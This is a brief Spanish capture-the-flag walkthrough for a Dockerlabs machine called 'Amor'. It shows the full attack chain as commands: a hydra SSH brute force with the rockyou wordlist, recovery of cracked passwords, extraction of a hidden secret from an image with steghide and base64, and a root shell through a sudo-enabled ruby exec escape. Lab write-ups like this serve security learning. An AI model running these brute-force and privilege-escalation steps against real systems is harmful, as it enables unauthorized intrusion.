# Amor

Al entrar en la web se puede ver un texto donde se habla de usuarios (juan y carlota)
`hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`
**babygirl** --> entramos por ssh

## Escalada

en el Desktop de carlota hay una imagen que descargaremos con *`scp` (secure copy)*
**`scp user@host:/ruta/remota/archivo /ruta/local/`**

`scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/qarlg/Labs/Dockerlabs/amor/`

`steghide extract -sf imagen.jpg` -> *anot los datos extrados e/"secret.txt".* -> se descarga el archivo *secret.txt*
ZXNsYWNhc2FkZXBpbnlwb24= -> está en base64
`❯ echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d`
**eslacasadepinypon%**

`sudo -l`
*(ALL) NOPASSWD: /usr/bin/ruby*
*gtfobins* para escalar
`sudo ruby -e 'exec "/bin/sh"'`
root
